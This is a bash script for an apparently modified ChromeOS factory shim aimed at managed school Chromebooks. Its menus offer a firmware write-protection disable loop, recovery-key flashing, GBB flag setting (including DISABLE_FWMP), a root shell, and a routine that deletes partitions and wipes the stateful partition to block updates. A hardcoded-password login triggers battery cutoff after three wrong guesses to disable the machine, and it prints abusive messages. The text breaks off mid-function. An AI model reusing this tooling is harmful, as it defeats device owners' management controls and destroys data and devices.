#!/bin/bash
reset
clear
DOWNLOADS_DIR=/usr/sbin
RECOVERY_KEY_FILE=dedede_recovery_v1.vbpubk
wpdis() {
failedwp=0
while true; do
clear
echo -e "Press CTRL + C to cancel"
if flashrom --wp-disable; then
clear
echo -e "${GREEN}SUCCESSSSSSSSSS YAYYYYYYYYY${RESET} (It took ${BRIGHT_BLUE}$failedwp${RESET} tries, cool!)"
sleep 3
break
else
echo -e ${RED}Failed.${RESET} Attempt ${RED}$failedwp${RESET}
let "failedwp+=1"
fi
done
}
unkeyroll() {
while true; do
if flashrom --wp-disable; then
echo -e "\e[31mFlashing key\e[0m"
futility gbb -s --flash --recoverykey="$DOWNLOADS_DIR/$RECOVERY_KEY_FILE"
clear

# Check if application was successful
if [ $? -eq 0 ]; then
    echo -e "\033[32mApplied the recovery key successfully, yippee!!\033[0m"
    sleep 3
    break
else
    echo -e "\e[31mFailed. Trying to fix chromebook, please wait.\e[0m"
        echo -e "\e[31mThis shouldn't ever happen!\e[0m"
    # Clear the vbpubk files from the Downloads folder only if the previous command fails
    exit 1
    sleep 3
    break
fi
else
echo "Disable WP dumbass!!"
sleep 3
break
fi
done
}
gbbflagger() {
while true; do
# Made by 0jos, creds to olyb & ChromeOS authors
if flashrom --wp-disable; then
old=$(futility gbb -g --flash --flags | tail -n 1)

flags=(
  "DEV_SCREEN_SHORT_DELAY|Makes dev screen timeout reduce to 2 seconds, beep is also gone|ok"
  "LOAD_OPTION_ROMS|BIOS should load option ROMs from arbitrary PCI devices.|unsupported"
  "ENABLE_ALTERNATE_OS|Boot a non-ChromeOS kernel.|unsupported"
  "FORCE_DEV_SWITCH_ON|Forces devmode (does NOT bypass FWMP)|ok"
  "FORCE_DEV_BOOT_USB|Allow booting from external disk even if dev_boot_usb=0.|ok"
  "DISABLE_FW_ROLLBACK_CHECK|Disable firmware rollback protection.|ok"
  "ENTER_TRIGGERS_TONORM|Allow Enter key to trigger dev->tonorm transition.|ok"
  "FORCE_DEV_BOOT_ALTFW|Allow booting altfw OSes even if dev_boot_altfw=0.|ok"
  "DEPRECATED_RUNNING_FAFT|Running FAFT tests (should NOT be set).|unsupported"
  "DISABLE_EC_SOFTWARE_SYNC|Disable EC software sync.|ok"
  "DEFAULT_DEV_BOOT_ALTFW|Default to booting altfw OS when dev screen times out.|ok"
  "DISABLE_AUXFW_SOFTWARE_SYNC|Disable auxiliary firmware software sync.|ok"
  "DISABLE_LID_SHUTDOWN|Disable shutdown on lid closed.|ok"
  "DEPRECATED_FORCE_DEV_BOOT_FASTBOOT_FULL_CAP|Allow full fastboot capability.|unsupported"
  "FORCE_MANUAL_RECOVERY|Recovery mode always assumes manual recovery.|ok"
  "DISABLE_FWMP|Ignore FWMP (highly recommended).|ok"
  "ENABLE_UDC|Enable USB Device Controller.|ok"
  "FORCE_CSE_SYNC|Always sync CSE, even if same as CBFS CSE.|ok"
)

declare -A picked

while true; do
  clear
  echo -e "${BOLD}Which GBB flags would you like?${RESET}\n"

  for i in "${!flags[@]}"; do
    IFS="|" read -r name desc status <<< "${flags[$i]}"
    num=$((i + 1))

    if [[ $status == "unsupported" ]]; then
      printf "%2d) %b%s%b, [Unsupported] %s\n\n" \
        "$num" "$RED" "$name" "$RESET" "$desc"
    else
      printf "%2d) %s, %s\n\n" "$num" "$name" "$desc"
    fi
  done

  if ((${#picked[@]})); then
    echo -e "Current GBB flags selected: ${GREEN}${!picked[*]}${RESET}"
  else
    echo "Current GBB flags selected: None"
  fi

  echo -e "\nType the number corresponding to the flag (ONE at a time)."
  read -ep "Select a GBB flag (or y to write said gbb flags): " sel

if [[ $sel == "y" ]]; then
  calculate_gbb_mask
  echo -e "The desired GBB flags for what you chose is ${GREEN}$userchose${RESET}"
  sleep 1
  echo "Writing gbb flags, press ctrl c if you'd like to cancel"
  sleep 5
  futility gbb -s --flash --flags=$userchose
  clear
  echo "old $old"
  echo "new flags: $userchose"
  sleep 3
  break
fi

if [[ $sel =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#flags[@]} )); then
  picked[$sel]=1
  echo -e "${GREEN}You picked flag $sel${RESET}"
else
  echo -e "${RED}Invalid option${RESET}"
  read -ep "Press enter to return :P"
fi

  sleep 1
done
else
echo "YO, you need to disable write protection before setting gbb flags."
sleep 3
break
fi
done
}
fullpath="$(dirname "$(realpath "${BASH_SOURCE[0]}")")"
first2=$(echo "$fullpath" | cut -d/ -f-3)
if [ "first2" = "/home/user" ]; then
    test=1
    break
fi
SCRIPT_DATE="[dec 31 2025]"
RED='\e[31m'
RESET='\e[0m'
GREEN='\e[32m'
YELLOW='\e[33m'
PURPLE='\033[35m'
BLUE='\e[34m'
BOLD='\e[1m'
RESET='\e[0m'
BRIGHT_BLUE='\e[96m'
echo -e "Installed payloads; ${BLUE}STIM, ${YELLOW}FMN, ${GREEN}debug bash, ${PURPLE}GBBFlagger, ${RED}WP Disable Loop, ${BRIGHT_BLUE}Unkeyroll${RESET}"
echo -e "${YELLOW}MODS; ${RESET} Hardcoded Admin, No tut"
echo -e "Made in ${PURPLE}$SCRIPT_DATE${RESET}"
sleep 3
clear
if [ "$test" = "1" ]; then
while true; do
clear
echo -e "${RED}WARNING, ${BRIGHT_BLUE}TEST MODE IS ON${RESET} what does this mean? it means you cant run certain scripts like FMN because you are not in a real ${BLUE}STIM.${RESET}"
echo "Continue? (y/n, case sensitive)"
read -ep "Enter: " warntest
case $warntest in
    "y")
    break
    ;;
    "n")
    echo "Why u leave :("
    exit
    ;;
    *)
    read -ep "Invalid input, press enter to try again."
    ;;
esac
done
fi
userroot=Admin
userrootopposite=Guest
failedtries=0
infmn=0
while true; do
afdhkl=k
gsdfjdfjh=s
ffhdsas=d
jkfdfdh=l
seuiweaewiy=o
fygugjffgg=G
ffdgjfdgf=i
nvgfgrtycea=e
cghkiuyktjr=V
uyturtfh=m
gjhfgdtryj=c
goon=$gsdfjdfjh$afdhkl$ffdgjfdgf$ffhdsas$ffhdsas$nvgfgrtycea$ffhdsas$jkfdfdh$seuiweaewiy$jkfdfdh
if [ "$infmn" = "1" ]; then
while true; do

clear
echo -e "${YELLOW} ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄        ▄ "
echo "▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░▌      ▐░▌"
echo "▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░▌░▌     ▐░▌"
echo "▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌▐░▌    ▐░▌"
echo "▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▐░▌ ▐░▌▐░▌ ▐░▌   ▐░▌"
echo "▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌"
echo "▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▀   ▐░▌▐░▌   ▐░▌ ▐░▌"
echo "▐░▌          ▐░▌       ▐░▌▐░▌    ▐░▌▐░▌"
echo "▐░▌          ▐░▌       ▐░▌▐░▌     ▐░▐░▌"
echo "▐░▌          ▐░▌       ▐░▌▐░▌      ▐░░▌"
echo -e " ▀            ▀         ▀  ▀        ▀▀ ${RESET}"
echo
if [ "$test" = "1" ]; then
echo -e "${BRIGHT_BLUE}TEST MODE${RESET}"
echo
fi
    echo "1) Block updates"
    echo -e "2) Go back to ${BLUE}STIM${RESET}"
    echo "3) Reboot"
    read -ep "Choose option: " choice

    case $choice in
        1)
        if [ "$test" = "1" ]; then
echo "You are currently in test mode, this wont work since this exploit only works in real stims"
echo
read -ep "Press enter to return to main menu"
else
            
            # get_internal take from https://github.com/applefritter-inc/BadApple-icarus
            get_internal() {
                # get_largest_cros_blockdev does not work in BadApple.
                local ROOTDEV_LIST=$(cgpt find -t rootfs) # thanks stella
                if [ -z "$ROOTDEV_LIST" ]; then
                    echo "Could not find root devices."
                    read -ep "Press Enter to return to menu..."
                    return 1
                fi
				local device_type=$(echo "$ROOTDEV_LIST" | grep -oE 'blk0|blk1|nvme|sda' | head -n 1)
                case $device_type in
                "blk0")
                    intdis=/dev/mmcblk0
                    intdis_prefix="p"
                    ;;
                "blk1")
                    intdis=/dev/mmcblk1
                    intdis_prefix="p"
                    ;;
                "nvme")
                    intdis=/dev/nvme0
                    intdis_prefix="n"
                    ;;
                "sda")
                    intdis=/dev/sda
                    intdis_prefix=""
                    ;;
                *)
                    echo "an unknown error occured. this should not have happened."
                    read -ep "Press Enter to return to menu..."
                    return 1
                    ;;
                esac
            }
            
            get_internal || continue

			get_booted_kernnum() {
                # This assumes intdis is set, which get_internal() handles later.
                if $(expr $(cgpt show -n "$intdis" -i 2 -P) > $(cgpt show -n "$intdis" -i 4 -P)); then
                    echo -n 2
                else
                    echo -n 4
                fi
            }

            get_booted_rootnum() {
	            expr $(get_booted_kernnum) + 1
            }
			
            echo "Detected internal disk: $intdis"
            
            # Create necessary directories
            mkdir -p /localroot /stateful
            
            # Mount and prepare chroot environment
            mount "${intdis}${intdis_prefix}$(get_booted_rootnum)" /localroot -o ro 2>/dev/null
            if [ $? -ne 0 ]; then
                echo "Failed to mount root partition"
                read -ep "Press Enter to return to menu..."
                continue
            fi
            
            mount --bind /dev /localroot/dev 2>/dev/null
            if [ $? -ne 0 ]; then
                echo "Failed to bind mount /dev"
                umount /localroot
                read -ep "Press Enter to return to menu..."
                continue
            fi
            
            # Modify partition attributes
            chroot /localroot cgpt add "$intdis" -i 2 -P 10 -T 5 -S 1 2>/dev/null
            if [ $? -ne 0 ]; then
                echo "Failed to modify partition attributes"
                umount /localroot/dev
                umount /localroot
                read -ep "Press Enter to return to menu..."
                continue
            fi
            
            # Use fdisk to delete partitions
            echo -e "d\n4\nd\n5\nw" | chroot /localroot fdisk "$intdis" >/dev/null 2>&1
            
            # Cleanup
            umount /localroot/dev
            umount /localroot
            rmdir /localroot
            
            crossystem disable_dev_request=1 2>/dev/null
            
            # Try to mount stateful partition
            if ! mount "${intdis}${intdis_prefix}1" /stateful 2>/dev/null; then
                mountlvm
                if [ $? -ne 0 ]; then
                    read -ep "Press Enter to return to menu..."
                    continue
                fi
            fi
            
            # Clear stateful partition
            rm -rf /stateful/*
            umount /stateful
			echo "Daub completed successfully!"
            echo "DO NOT POWERWASH IN CHROMEOS! YOUR DEVICE WILL BOOTLOOP!"
			echo "(bootloop is fixable by recovering)"
            read -ep "Press Enter to return to menu..."
            fi
            ;;
        2)
        clear
            echo -e "Heading to ${BLUE}STIM,${RESET} please wait..."
            sleep 3
            infmn=0
            break
            ;;
        3)
         if [ "$test" = "1" ]; then
echo -e "Since your in test mode, this wont do anything but in the real ${BLUE}STIM${RESET} it will reboot your computer."
echo
read -ep "Press enter to return to main menu"
else
            reboot -f
            echo "For some reason you didnt reboot, weird, lets try it 10 more times!"
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            fi
            ;;
        *)
            echo "Invalid option, please try again..."
            read -ep "Press Enter to return to menu..."
            ;;
    esac
done

mountlvm(){
     vgchange -ay #active all volume groups
     volgroup=$(vgscan | grep "Found volume group" | awk '{print $4}' | tr -d '"')
     echo "found volume group:  $volgroup"
     mount "/dev/$volgroup/unencrypted" /stateful || {
         echo "couldnt mount p1 or lvm group.  Please recover"
         return 1
     }
}

fi
if [ "$userroot" = "Guest" ]; then
clear
echo -e "${BLUE} ░▒▓███████▓▒░▒▓████████▓▒░▒▓█▓▒░▒▓██████████████▓▒░  ${RESET}"
echo -e "${BLUE}░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE} ░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo
if [ "$test" = "1" ]; then
echo -e "${BRIGHT_BLUE}TEST MODE${RESET}"
echo
fi
echo -e "Currently logged in as: ${RED}$userroot${RESET}" 
echo
echo
echo "What would you like to do?"
    echo -e "1) Goto ${YELLOW}FMN${RESET} (Used for blocking updates)"
    echo -e "2) Login as ${GREEN}$userrootopposite${RESET}"
    echo "3) Creds :)"
    echo "4) Reboot"
    read -ep "Choose option: " userchoice

    case $userchoice in
        1)
        clear
    echo -e "Heading to ${YELLOW}FMN${RESET}, please wait..."
    sleep 3
    infmn=1
    ;;
        2)
        while true; do
        if [ $failedtries = 3 ]; then
        if [ "$test" = "1" ]; then
        clear
echo "So your computer would get bricked but since your in test mode, your good :)"
sleep 3
failedtries=0
break
else
clear
crossystem battery_cutoff_request=1 2>/dev/null
  echo "Oh nah, you did it. You bruteforced it and got fucked in the ass for it, your computer is broken now."
  sleep 3
  echo "I hope you learned your lesson, your gonna have to goto your IT to fix it"
  sleep 5
  echo "Im not telling you how to restart your computer or fix it since you tried to brute force it."
  sleep 20
  echo "If your gonna give this computer to IT for them to try and fix it while the screen is still on, let me say this"
  sleep 1 
  echo "This student tried to use a random script hosted on the internet while not understanding the code behind it, and when they used the script, they decided to type in a random password assumming it would give them access to early access unenrollment stuff."
  echo "The script they're trying to use is a modified version of a chromeos factory shim, which means theyve downloaded illegal stuff just to get root access to laptops that they dont own. if you ask me then this is suspension worthy."
  sleep 9999999999999999999999999999
  fi
else
         clear
		echo "Login for debugging, password is 2"
        echo -e "Type '1' as the pass if you wanna goto ${YELLOW}FMN${RESET} instead"
        echo -e "Failed tries ${RED}$failedtries${RESET}/3"
		if [ "$test" = "1" ]; then
		echo "Test mode is on, type in what ever you want and youll get admin privileges."
		fi
    read -sep "Login: " userpass
    case $userpass in
        1)
        clear
        echo -e "Heading to ${YELLOW}FMN,${RESET} please wait..."
        sleep 3
        infmn=1
        break
        ;;
        
        2)
        clear
        echo -e "${GREEN}Success!"
        echo -e "${RESET}Restarting as ${GREEN}Admin,${RESET} please wait..."
        sleep 3
        userroot=Admin
        userrootopposite=Guest
        failedtries=0
        break
            ;;
        *)
		if [ "$test" = "1" ]; then
		echo "Me when test = 1"
        sleep 3
		userroot=Admin
        userrootopposite=Guest
        failedtries=0
		break
		fi
        clear
            echo "Wrong pass"
			sleep 1
            let "failedtries+=1"
            ;;
            esac
fi
done
;;
3)
clear
echo -e "                                                            %%%%%%%#######################%%%%%%%%%%"${RESET}
echo -e "                                                     %%%###################*###########################%%%%"${RESET}
echo -e "                                               %%%###########*****++=====----===========++++******###########%%%%"${RESET}
echo -e "                                          %%%#########**++==--:::${BLUE}.............................${RESET}::::-==++***#########%%%"${RESET}
echo -e "                                      %%%########*+==-::${BLUE}................................................${RESET}::-=+***#######%%%"
echo -e "                                  %%%######**+=--::${BLUE}..........................................................${RESET}::-=++***#####%%%"
echo -e "                            %%######*+=-::${BLUE}.............................................................................${RESET}:=+***####%%"
echo -e "                         %%######*+=-:${BLUE}....................................................................................${RESET}:-+**#####%%"
echo -e "                   %#####*+=::${BLUE}...................................${PURPLE}::---==+++**####****++==---:::${RESET}${BLUE}...................................${RESET}:=+*#####%%"
echo -e "                 %#####*+-:${BLUE}...................................${PURPLE}::-%%%%%%#%@@@@@@@%#%%@@%%#*+==---::${RESET}${BLUE}...................................${RESET}-+*#####%%"
echo -e "               %%####*+-:${BLUE}...................................${PURPLE}::-=+%###%%%%%%%%@@%#%#%%%%%%%%%#*+=---:${RESET}${BLUE}..................................${RESET}:-+*#####%"
echo -e "             %%#####+=:${BLUE}...................................${PURPLE}::-=+%%%%#+%%%%%%%%@@%#%#@@@%%%%%%%%%#*=---:${RESET}${BLUE}..................................${RESET}:-+######%"
echo -e "           %%#####*=:${BLUE}...................................${PURPLE}::-=+#####%%%%%%%%###%@%#%#@@@@@@%%%%#####+=---:${RESET}${BLUE}..................................${RESET}:=*#####%%"
echo -e "          %#####*=:${BLUE}....................................${PURPLE}:--+%%%#+==%##%++%####%@%##%@@@@@@%#+=%%%=%%%+=--:${RESET}${BLUE}...................................${RESET}-=*#####%%"
echo -e "        %%####*+-:${BLUE}....................................${PURPLE}:-=*%%%%%#%%%%%%%%%#%%%%@@%%@@@@@@#+-%%%%%%%%###+--:${RESET}${BLUE}...................................${RESET}:-+*#####%"
echo -e "       %#####*=:${BLUE}.....................................${PURPLE}:-=*%@@%##%#%%%%%##%%%%##%@@@@@@@#=%%%%%%%%:%%%%#+--:${RESET}${BLUE}....................................${RESET}:=*#####%"
echo -e "      %####*+-:${BLUE}.....................................${PURPLE}:-=#%@@@@%%####%%%%%%@@%%%%%%@@%%%%%-%%%%%%%%%+#%@@#+--:${RESET}${BLUE}....................................${RESET}:-+#####%%"
echo -e "     %####*+-${BLUE}......................................${PURPLE}:-=*%@@%%%%%%%#%%#%%%#%@%%%%%%%%%%%%%%%%%%%%%%#%%@%%#=-::${RESET}${BLUE}....................................${RESET}$:-+*#####%"
echo -e "   %%####*=:${BLUE}.......................................${PURPLE}:-+#@@@%%%%%%%%%%%%%#%#%%%%%%#%%%%%#%%%%%%%%#%#%%%%##+=-:${RESET}${BLUE}......................................${RESET}:=*#####%"
echo -e "  %%####*=:${BLUE}.......................................${PURPLE}:-=*%@@%%#%%%@@%%%%%%%%##%%##%%%%%%%#%#####%%#%%%%%%%#%#+-::${RESET}${BLUE}......................................${RESET}:=*#####%"
echo -e " %%####*+:${BLUE}........................................${PURPLE}:-+#%%#%%%%%%@@@%%%%%%%%%%%@@%%%%%%%#%%%##%%#%%%###%%%%#*=-:${RESET}${BLUE}.......................................${RESET}:=*#####%"
echo -e "%%####*=:${BLUE}.........................................${PURPLE}:-+#%#%%%%%%%#%@%%%%%%%###%%%##%%%%%%%%%###%%#%%%%%%%%##*=-:${RESET}${BLUE}........................................${RESET}:+*#####%"
echo -e "%####*+:${BLUE}..........................................${PURPLE}:-+#%##%%%####%@%%%%%%##%%%#######%%%%%%###%%%%%%%%%%%#%#+-:${RESET}${BLUE}.........................................${RESET}:+*####%"
echo -e "%####*=:${BLUE}..........................................${PURPLE}:=+#%#%%%%%%%#%@@%%%%%%%%@%########%#%%%%%#%%%@@@@@@@%@@#+-:${RESET}${BLUE}.........................................${RESET}:=*#####"
echo -e "%%###*+-${BLUE}..........................................${PURPLE}:-+#%##%%%%%%#%@@@%%%%##%@%%%###%%%###%%%%%%%%#%%%%%##%%#+-:${RESET}${BLUE}.........................................${RESET}-+*####%"
echo -e " %%###*+-${BLUE}.........................................${PURPLE}:-+#%#%%%%%##%%@@@%%%%%#%%%@%%%%%%###%%%%%%%@%#%%%%%##%%*=-:${RESET}${BLUE}........................................${RESET}-+*####%"
echo -e "  %%###*+-${BLUE}........................................${PURPLE}:-=#@@@%%%%%#%#%@@@%%%%%###########%%%%%%%@@%@@@%%%##%%#+-::${RESET}${BLUE}.......................................${RESET}:+*####%"
echo -e "   %%####+-:${BLUE}.......................................${PURPLE}:-+%@%#%%%%%###%@@@%%%%%%%%#####%%%%%%%%@@%#%%%%##%%@%*=-:${RESET}${BLUE}......................................${RESET}:-+*####%"
echo -e "    %%####+-:${BLUE}......................................${PURPLE}:-=*%%%%%##%%%#%@@@@@@%%%%%%%%%%%%%%%%%%%##%#%%%%##%%#+-::${RESET}${BLUE}.....................................${RESET}:-*#####%"
echo -e "     %%####*=:${BLUE}......................................${PURPLE}:-+#%%#%%%%#%@%%%%@@@@%%%%%%%%%%%%%%%##%%%%%%%###%@%+=-:${RESET}${BLUE}.....................................${RESET}:=*####%%"
echo -e "       %####*=:${BLUE}......................................${PURPLE}:-+#%###%%%%%#%%#%@@@@@@@@@@@@@@%%#%%%%%%%%%%%#%%%*=-:${RESET}${BLUE}.....................................${RESET}:=*####%%"
echo -e "        %####*+-:${BLUE}.....................................${PURPLE}:-=#%@@@%%#%++#%%%%%%@%###%%###%%%%%%%%%%%%%#%%#+--:${RESET}${BLUE}....................................${RESET}:-+*####%"
echo -e "         %%####*=:${BLUE}.....................................${PURPLE}:-=*%@@%#+=+%%#%%##%@%%%%%%%%%%%%%%%%%%%%%#%%#+-::${RESET}${BLUE}....................................${RESET}:=*####%%"
echo -e "           %####*+-:${BLUE}.....................................${PURPLE}:-+#%%#%%%%%%%#%#@@%%%%%%%%%%%%%%%%%%##%%#*=-:${RESET}${BLUE}....................................${RESET}:-+*####%"
echo -e "            %%####*=:${BLUE}.....................................${PURPLE}::=+#%%%%%#%#%%%@@%%+%##%++%%%%%#%@%%%#*=--:${RESET}${BLUE}...................................${RESET}:-+*####%%"
echo -e "              %%###**=:${BLUE}.....................................${PURPLE}::-+%#%%@%###@@@@#%#%%#%%#%%%%%%%%#+=-::${RESET}${BLUE}...................................${RESET}:-=*####%%"
echo -e "                %%###*+=:${BLUE}......................................${PURPLE}:--+*##%%@@@@@%%%@@%%%%%%%%#*+=--::${RESET}${BLUE}...................................${RESET}:-=+*####%"
echo -e "                  %%###**=:${BLUE}.......................................${PURPLE}:--==+*##%%%%%%%%###*++=--::${RESET}${BLUE}......................................${RESET}:=**####%%"
echo -e "                    %%####*=-:${BLUE}........................................${PURPLE}::----=======----:::${RESET}${BLUE}......................................${RESET}::-+*#####%%"
echo -e "                      %%###**+=:${BLUE}..............................................................................................${RESET}:-=**####%%"
echo -e "                         %%###**+=:${BLUE}........................................................................................${RESET}:-=+*#####%%"
echo -e "                          %%####**+-:${BLUE}.................................................................................${RESET}::-=+*#####%%"
echo -e "                             %%####**+=-:${BLUE}..........................................................................${RESET}::-+**#####%%"
echo -e "                                 %%####***+=-:${BLUE}..................................................................${RESET}::-=+*#####%%%"
echo -e "                                    %%####***+=-::${BLUE}.......................................................${RESET}:::-==+**#####%%%"
echo -e "                                        %%######**++=-:::${BLUE}..........................................${RESET}:::-=++**#######%%%"
echo -e "                                            %%%#######****++==--::::::::::::::::::::::::::::-===++*****#######%%%"${RESET}
echo -e "                                                   %%%##########******************+++++++*****##########%%%%"${RESET}
echo -e "                                                         %%%%%################################%%%%%"${RESET}
echo -e ""
echo -e "${PURPLE}  ▄▄▄▄                   ${RESET}          ▄▄▄      ▄▄▄          ▄▄        ${YELLOW}  ▄▄▄▄▄▄▄ ▄▄▄      ▄▄▄ ▄▄▄    ▄▄▄ ${RESET}                 ▄▄  ${BLUE}  ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄      ▄▄▄ "
echo -e "${PURPLE}▄██████▄  ▀▀             ${RESET}          ████▄  ▄████          ██        ${YELLOW} ███▀▀▀▀▀ ████▄  ▄████ ████▄  ███ ${RESET}                 ██  ${BLUE} █████▀▀▀ ▀▀▀███▀▀▀  ███  ████▄  ▄████ "
echo -e "${PURPLE}███  ███  ██ ▄███▄ ▄█▀▀▀ ${RESET}          ███▀████▀███  ▀▀█▄ ▄████ ▄█▀█▄  ${YELLOW} ███▄▄    ███▀████▀███ ███▀██▄███ ${RESET}   ▀▀█▄ ████▄ ▄████  ${BLUE}  ▀████▄     ███     ███  ███▀████▀███ "
echo -e "${PURPLE}███▄▄███ ▀██ ██ ██ ▀███▄ ${RESET}  ▀▀▀▀▀   ███  ▀▀  ███ ▄█▀██ ██ ██ ██▄█▀  ${YELLOW} ███▀▀    ███  ▀▀  ███ ███  ▀████ ${RESET}  ▄█▀██ ██ ██ ██ ██  ${BLUE}    ▀████    ███     ███  ███  ▀▀  ███ "
echo -e "${PURPLE} ▀████▀   ██ ▀███▀ ▄▄▄█▀ ${RESET}          ███      ███ ▀█▄██ ▀████ ▀█▄▄▄  ${YELLOW} ███      ███      ███ ███    ███ ${RESET}  ▀█▄██ ██ ██ ▀████  ${BLUE} ███████▀    ███    ▄███▄ ███      ███ "
echo -e "${PURPLE}          ██             ${RESET}                                          ${YELLOW}                                  ${RESET}                     ${BLUE}                                      " 
echo -e "${PURPLE}       ▀▀▀               ${RESET}                                          ${YELLOW}                                  ${RESET}                     ${BLUE}                                     ${RESET}"
echo
read -ep "Press enter to return go back to the main menu :P"
;;
        4)
         if [ "$test" = "1" ]; then
echo -e "Since your in test mode, this wont do anything but in the real ${BLUE}STIM${RESET} it will reboot your computer."
echo
read -ep "Press enter to return to main menu"
else
            reboot -f
            echo "For some reason u didnt reboot, weird, lets try it 10 more times!"
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            fi
            ;;
        *)
            read -ep "Invalid option, press enter to return :P"			
            ;;
    esac
fi



    
if [ "$userroot" = "Admin" ]; then
clear
echo -e "${BLUE} ░▒▓███████▓▒░▒▓████████▓▒░▒▓█▓▒░▒▓██████████████▓▒░  ${RESET}"
echo -e "${BLUE}░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE} ░▒▓██████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo -e "${BLUE}░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ${RESET}"
echo
if [ "$test" = "1" ]; then
echo -e "${BRIGHT_BLUE}TEST MODE${RESET}"
echo
fi
echo -e "Currently logged in as: ${GREEN}$userroot${RESET}" 
echo ""
echo
echo "What would you like to do?"
    echo "1) Goto shell for debugging"
    echo -e "2) Login as ${RED}$userrootopposite${RESET}"
    echo "3) Reboot"
	echo -e "4) ${PURPLE}GBBFlagger${RESET}"
    echo -e "5) ${RED}WP Disable Loop${RESET}"
    echo -e "6) ${BRIGHT_BLUE}Unkeyroll${RESET}"
	read -ep "Choose Option: " userchoice
case $userchoice in
        1)
        clear
echo -e "${BLUE}   SSSSSSSSSSSSSSS hhhhhhh                                lllllll lllllll "
echo -e "${BLUE} SS:::::::::::::::Sh:::::h                                l:::::l l:::::l "
echo -e "${BLUE}S:::::SSSSSS::::::Sh:::::h                                l:::::l l:::::l "
echo -e "${BLUE}S:::::S     SSSSSSSh:::::h                                l:::::l l:::::l "
echo -e "${BLUE}S:::::S             h::::h hhhhh           eeeeeeeeeeee    l::::l  l::::l "
echo -e "${BLUE}S:::::S             h::::hh:::::hhh      ee::::::::::::ee  l::::l  l::::l "
echo -e "${BLUE} S::::SSSS          h::::::::::::::hh   e::::::eeeee:::::eel::::l  l::::l "
echo -e "${BLUE}  SS::::::SSSSS     h:::::::hhh::::::h e::::::e     e:::::el::::l  l::::l "
echo -e "${BLUE}    SSS::::::::SS   h::::::h   h::::::he:::::::eeeee::::::el::::l  l::::l "
echo -e "${BLUE}       SSSSSS::::S  h:::::h     h:::::he:::::::::::::::::e l::::l  l::::l "
echo -e "${BLUE}            S:::::S h:::::h     h:::::he::::::eeeeeeeeeee  l::::l  l::::l "
echo -e "${BLUE}            S:::::S h:::::h     h:::::he:::::::e           l::::l  l::::l "
echo -e "${BLUE}SSSSSSS     S:::::S h:::::h     h:::::he::::::::e         l::::::ll::::::l"
echo -e "${BLUE}S::::::SSSSSS:::::S h:::::h     h:::::h e::::::::eeeeeeee l::::::ll::::::l"
echo -e "${BLUE}S:::::::::::::::SS  h:::::h     h:::::h  ee:::::::::::::e l::::::ll::::::l"
echo -e "${BLUE} SSSSSSSSSSSSSSS    hhhhhhh     hhhhhhh    eeeeeeeeeeeeee llllllllllllllll${RESET}"
    echo
    echo -e "Type exit to head back to ${BLUE}STIM${RESET}"
    bash
    ;;
        2)
        clear
        userroot=Guest
        userrootopposite=Admin
        echo "Entering locked down mode, please wait..."
        sleep 3
        ;;
        
        3)
         if [ "$test" = "1" ]; then
echo -e "Since your in demo mode, this wont do anything but in the real ${BLUE}STIM${RESET} it will reboot your computer."
echo
read -ep "Press enter to return to main menu"
else
            reboot -f
            echo "For some reason u didnt reboot, weird, lets try it 10 more times!"
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            reboot -f
            fi
            ;;
            
        5)
        clear
        echo -e "heading to the ${RED}WP Disable Loop${RESET} payload..."
        sleep 1
        wpdis
        ;;

        6)
        clear
        echo -e "heading tothe ${BRIGHT_BLUE}Unkeyroll${RESET} payload..."
        unkeyroll
        ;;
        
		4)
        clear
		echo -e "heading to ${PURPLE}GBBFlagger...${RESET}"
		sleep 1
        calculate_gbb_mask() {
  local mask=0

  for sel in "${!picked[@]}"; do
    (( mask |= (1 << (sel - 1)) ))
  done

